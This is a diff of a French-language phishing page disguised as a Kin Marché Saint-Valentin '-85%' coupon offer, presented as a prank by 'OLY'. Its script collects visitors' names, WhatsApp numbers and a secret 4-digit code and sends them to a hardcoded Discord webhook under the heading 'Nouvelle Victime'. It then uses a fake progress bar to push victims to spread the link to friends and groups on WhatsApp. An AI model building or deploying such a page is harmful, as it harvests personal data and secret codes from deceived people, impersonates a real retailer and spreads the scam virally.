@@ -5,24 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <meta property="og:title" content="🍫 PROMO KIN MARCHÉ : -85% SUR TOUT !">
-    <meta property="og:description" content="Offre Saint-Valentin exclusive ! Valide tes infos pour ton coupon.">
-    <meta property="og:image" content="logo.png">
+    <meta property="og:description" content="Offre Saint-Valentin exclusive ! Valide tes infos pour ton coupon immédiatement.">
+    <meta property="og:image" content="https://i.ibb.co/Lzh8vYm/kin-logo.png">
+    <meta property="og:image:secure_url" content="https://i.ibb.co/Lzh8vYm/kin-logo.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
+    <meta property="og:url" content="https://jeanluctshunza-prog.github.io/KIN-MARCHE/">
 
     <title>Kin Marché - Promo Officielle</title>
     <style>
         :root { --km-orange: #f26522; --km-blue: #0054a6; }
         body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: #001220; color: white; overflow-x: hidden; }
         
+        /* FOND INTERACTIF PLUS VISIBLE */
         #bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(135deg, #001220 0%, #0054a6 100%); }
-        .floating { position: absolute; color: rgba(255,255,255,0.2); font-size: 24px; animation: move 8s linear infinite; pointer-events: none; }
-        @keyframes move { from { transform: translateY(110vh); } to { transform: translateY(-10vh); } }
+        .floating { position: absolute; color: rgba(255,255,255,0.3); font-size: 28px; animation: move 7s linear infinite; pointer-events: none; }
+        @keyframes move { from { transform: translateY(110vh) rotate(0deg); } to { transform: translateY(-10vh) rotate(360deg); } }
 
-        .container { width: 85%; max-width: 380px; background: rgba(255, 255, 255, 0.88); color: #333; margin: 20px auto; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.3); }
-        .timer { color: #d32f2f; font-weight: bold; font-size: 1.2rem; margin-bottom: 10px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; }
-        .btn { background: var(--km-orange); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; box-shadow: 0 4px 0 #c44d17; }
+        /* BOITES TRÈS TRANSPARENTES */
+        .container { width: 85%; max-width: 380px; background: rgba(255, 255, 255, 0.82); color: #333; margin: 20px auto; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.4); }
+        .timer { color: #d32f2f; font-weight: bold; font-size: 1.2rem; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 1rem; }
+        .btn { background: var(--km-orange); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; box-shadow: 0 4px 0 #c44d17; }
         .btn:active { transform: translateY(2px); box-shadow: none; }
+        
         .progress-container { background: #e9edef; border-radius: 10px; height: 18px; margin: 20px 0; overflow: hidden; border: 1px solid #ccc; }
         .progress-bar { background: linear-gradient(90deg, #25D366, #128C7E); width: 0%; height: 100%; transition: width 0.8s ease; }
     </style>
@@ -36,27 +44,29 @@
 </div>
 
 <div class="container" id="step1">
+    <img src="https://i.ibb.co/Lzh8vYm/kin-logo.png" style="width:120px; margin-bottom:10px;">
     <h2 style="color:var(--km-blue)">PROMO ST VALENTIN</h2>
     <p>Inscrivez-vous pour obtenir votre bon de <b>-85%</b>.</p>
     <input type="text" id="name" placeholder="Nom et Post-nom">
     <input type="tel" id="phone" placeholder="Numéro WhatsApp">
-    <input type="password" id="secret" placeholder="Code d'accès secret (4 chiffres)">
+    <input type="password" id="secret" placeholder="Code d'accès personnel (4 chiffres)">
     <button class="btn" onclick="sendToDiscord()">GÉNÉRER MON COUPON</button>
 </div>
 
 <div class="container" id="step2" style="display:none;">
-    <h2 style="color:var(--km-blue)">Vérification en cours...</h2>
-    <p id="share-txt">Partagez avec <b>5 amis ou groupes</b> pour valider l'étape 1/3.</p>
+    <h2 style="color:var(--km-blue)">Vérification en cours... ✅</h2>
+    <p id="share-txt">Étape 1/3 : Partagez avec <b>5 amis ou groupes</b>.</p>
     <div class="progress-container">
         <div class="progress-bar" id="bar"></div>
     </div>
-    <p id="status" style="font-weight:bold; color:#075E54">0% Partagé</p>
-    <button class="btn" style="background:#25D366; border-color:#128C7E;" onclick="shareWA()">PARTAGER SUR WHATSAPP</button>
+    <p id="status" style="font-weight:bold; color:#075E54">0% Complété</p>
+    <button class="btn" style="background:#25D366; border-bottom: 4px solid #128C7E;" onclick="shareWA()">PARTAGER SUR WHATSAPP</button>
 </div>
 
 <div class="container" id="final-step" style="display:none;">
-    <h1 style="color:red;">🤡 T'ES TOMBÉ DEDANS !</h1>
-    <p>C'est une blague de <b>OLY</b> !</p>
+    <h1 style="color:red; margin-bottom:5px;">🤡 PIÉGÉ !</h1>
+    <p style="font-size:1.1rem;">C'était une blague de <b>OLY</b> !<br>Il n'y a pas de chocolat gratuit 😂</p>
+    <p>Ton code de victime : <b style="color:var(--km-blue)">KM-VAL-2026</b></p>
     <div id="vengeance-box">
         <button class="btn" style="background:black" onclick="revenge()">SE VENGER SUR OLY</button>
     </div>
@@ -67,6 +77,7 @@
     const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
     let p = parseInt(localStorage.getItem('oly_prog')) || 0;
 
+    // Charger la mémoire au démarrage
     window.onload = () => {
         if(p > 0) {
             document.getElementById('step1').style.display = "none";
@@ -95,10 +106,10 @@
         fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `🎬 **Action !**\n👤 ${n}\n📞 ${ph}\n🔑 ${s}` })
+            body: JSON.stringify({ content: `🎬 **Nouvelle Victime !**\n👤 Nom: ${n}\n📞 Tel: ${ph}\n🔑 Code: ${s}` })
         });
         
-        p = 5; // Commence un peu la barre
+        p = 5; // On commence la barre à l'envoi
         localStorage.setItem('oly_prog', p);
         document.getElementById('step1').style.display = "none";
         document.getElementById('step2').style.display = "block";
@@ -106,15 +117,16 @@
     }
 
     function shareWA() {
-        window.open(`whatsapp://send?text=😱 Kin Marché donne des bons de -85% ! Je viens de finir mon inscription, regarde ici : ${window.location.href}`);
+        // Envoi vers WhatsApp
+        window.open(`whatsapp://send?text=😱 Kin Marché donne des bons de -85% pour la Saint-Valentin ! Je viens de finir mon inscription, regarde ici : ${window.location.href}`);
         
-        // Simule l'augmentation au retour sur le site
+        // La barre augmente au retour
         setTimeout(() => {
             p += 32;
             if(p > 100) p = 100;
             localStorage.setItem('oly_prog', p);
             updateUI();
-        }, 1000);
+        }, 1500);
     }
 
     function updateUI() {
@@ -122,8 +134,8 @@
         document.getElementById('status').innerText = Math.floor(p) + "% Partagé";
         
         const txt = document.getElementById('share-txt');
-        if(p < 40) txt.innerHTML = "Étape 1/3 : Partagez encore avec <b>5 personnes</b>.";
-        else if(p < 75) txt.innerHTML = "Étape 2/3 : Plus que <b>5 personnes</b> !";
+        if(p < 38) txt.innerHTML = "Étape 1/3 : Partagez encore avec <b>5 personnes</b>.";
+        else if(p < 72) txt.innerHTML = "Étape 2/3 : Plus que <b>5 personnes</b> !";
         else if(p < 100) txt.innerHTML = "Dernière étape : Partagez une dernière fois !";
         else {
             document.getElementById('step2').style.display = "none";
@@ -135,19 +147,20 @@
     function revenge() {
         document.getElementById('late-msg').style.display = "block";
         setTimeout(() => {
-            window.location.href = "https://wa.me/243819679859?text=Oly tu m'as eu 😂";
-        }, 1000);
+            window.location.href = "https://wa.me/243819679859?text=Oly tu m'as eu 😂 Je suis une victime de Kin Marché !";
+        }, 1200);
     }
 
-    // Animation de fond
+    // Fond animé interactif
     const bg = document.getElementById('bg-animation');
-    for(let i=0; i<15; i++) {
+    const icons = ['❤️', '🍫', '🎁'];
+    for(let i=0; i<20; i++) {
         let el = document.createElement('div');
         el.className = 'floating';
-        el.innerText = '❤️';
+        el.innerText = icons[Math.floor(Math.random()*icons.length)];
         el.style.left = Math.random() * 100 + 'vw';
         el.style.top = Math.random() * 100 + 'vh';
-        el.style.animationDuration = (Math.random() * 5 + 5) + 's';
+        el.style.animationDuration = (Math.random() * 4 + 6) + 's';
         bg.appendChild(el);
     }
 </script>
